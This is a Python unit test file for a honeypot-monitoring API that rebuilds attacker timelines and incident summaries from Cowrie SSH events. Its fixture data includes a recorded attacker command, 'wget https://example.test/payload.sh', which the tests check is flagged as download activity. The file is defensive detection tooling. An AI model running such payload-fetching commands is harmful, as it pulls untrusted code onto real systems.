import tempfile
import unittest
from pathlib import Path

import pandas as pd
from fastapi.testclient import TestClient

from api.main import create_app
from src import analysis, database
from src.parser import EVENT_COLUMNS


class TestIncidentTimeline(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.db = Path(self.temp.name) / "timeline.db"
        database.init_db(reset=True, db_path=self.db)
        with database.get_connection(self.db) as connection:
            connection.execute(
                "CREATE TABLE session_clusters (session TEXT, behavior TEXT)"
            )
            connection.executemany(
                "INSERT INTO session_clusters VALUES (?, ?)",
                [("session-a", "Command Activity"), ("session-b", "Recon")],
            )
        self.client = TestClient(create_app(db_path=self.db))
        event_rows = [
            {"timestamp": "2026-01-01T10:00:03Z", "session": "session-a",
             "src_ip": "192.0.2.5", "eventid": "cowrie.command.input",
             "command": "wget https://example.test/payload.sh"},
            {"timestamp": "2026-01-01T10:00:01Z", "session": "session-a",
             "src_ip": "192.0.2.5", "eventid": "cowrie.login.failed", "username": "root"},
            {"timestamp": "2026-01-01T10:00:02Z", "session": "session-a",
             "src_ip": "192.0.2.5", "eventid": "cowrie.login.success", "username": "root"},
            {"timestamp": "2026-01-02T10:00:01Z", "session": "session-b",
             "src_ip": "198.51.100.8", "eventid": "cowrie.session.connect", "src_port": 2222},
        ]
        events = pd.DataFrame(event_rows)
        events["timestamp"] = pd.to_datetime(events["timestamp"], utc=True)
        database.load_events(events.reindex(columns=EVENT_COLUMNS), db_path=self.db)

    def tearDown(self):
        self.temp.cleanup()

    def test_event_order_evidence_and_incident_summary(self):
        response = self.client.get("/api/attackers/192.0.2.5/timeline")
        self.assertEqual(response.status_code, 200)
        result = response.json()
        self.assertEqual(result["timeline_level"], "event")
        self.assertEqual(result["timestamp_precision"], "seconds")
        self.assertEqual(
            [event["eventid"] for event in result["events"]],
            ["cowrie.login.failed", "cowrie.login.success", "cowrie.command.input"],
        )
        self.assertEqual(result["events"][0]["evidence"]["username"], "root")
        command_event = result["events"][2]
        self.assertEqual(command_event["evidence"]["command"], "wget https://example.test/payload.sh")
        self.assertEqual(command_event["evidence"]["download_tools"], ["wget"])
        self.assertTrue(command_event["is_download_activity"])
        self.assertEqual(command_event["session"], "session-a")
        summary = result["incident_summary"]
        self.assertEqual(summary["event_count"], 3)
        self.assertEqual(summary["session_count"], 1)
        self.assertEqual(summary["first_seen"], "2026-01-01T10:00:01+00:00")
        self.assertEqual(summary["last_seen"], "2026-01-01T10:00:03+00:00")
        self.assertIn("does not establish attacker intent", summary["description"])

    def test_date_behavior_and_event_type_filters(self):
        filtered = self.client.get(
            "/api/attackers/192.0.2.5/timeline",
            params={"start": "2026-01-01", "end": "2026-01-01",
                    "behavior": "Command Activity", "event_type": "cowrie.login.success"},
        )
        self.assertEqual(filtered.status_code, 200)
        self.assertEqual(len(filtered.json()["events"]), 1)
        result = filtered.json()
        self.assertEqual(result["events"][0]["eventid"], "cowrie.login.success")
        self.assertEqual(result["events"][0]["evidence"]["username"], "root")
        self.assertEqual(result["incident_summary"]["event_count"], 3)
        self.assertEqual(
            result["incident_summary"]["scope"],
            "Includes all events matching the active date and behavior filters; "
            "independent of the event-type filter applied to the detailed timeline.",
        )
        self.assertEqual(
            {item["event_type"]: item["count"] for item in result["incident_summary"]["event_counts"]},
            {"Failed Honeypot Login": 1, "Observed Command": 1, "Successful Honeypot Login": 1},
        )

        download_only = self.client.get(
            "/api/attackers/192.0.2.5/timeline", params={"event_type": "download_tool"}
        )
        self.assertEqual(len(download_only.json()["events"]), 1)
        self.assertTrue(download_only.json()["events"][0]["is_download_activity"])

        incident = self.client.get(
            "/api/attackers/192.0.2.5/incident",
            params={"start": "2026-01-01", "behavior": "Command Activity"},
        )
        self.assertEqual(incident.status_code, 200)
        self.assertEqual(incident.json()["event_count"], 3)
        self.assertEqual(incident.json()["incident_summary"]["session_count"], 1)

    def test_empty_and_missing_data_are_safe(self):
        empty = analysis.reconstruct_incident_timeline(pd.DataFrame())
        self.assertEqual(empty["events"], [])
        self.assertEqual(empty["event_count"], 0)
        self.assertEqual(empty["incident_summary"]["event_counts"], [])
        self.assertEqual(empty["incident_summary"]["session_count"], 0)
        missing = analysis.reconstruct_incident_timeline(pd.DataFrame([
            {"id": 1, "eventid": "cowrie.session.connect", "timestamp": "bad-time"},
            {"id": 2, "eventid": "cowrie.login.failed", "timestamp": None},
        ]))
        self.assertEqual(len(missing["events"]), 2)
        self.assertIsNone(missing["events"][0]["timestamp"])
        self.assertEqual(missing["events"][0]["evidence"], {})
        self.assertIsNone(missing["events"][1]["session"])

        no_type_matches = self.client.get(
            "/api/attackers/192.0.2.5/timeline", params={"event_type": "unknown.event"}
        )
        self.assertEqual(no_type_matches.status_code, 200)
        self.assertEqual(no_type_matches.json()["events"], [])
        self.assertEqual(no_type_matches.json()["event_count"], 3)

        missing_attacker = self.client.get("/api/attackers/203.0.113.4/timeline")
        self.assertEqual(missing_attacker.status_code, 404)


if __name__ == "__main__":
    unittest.main()
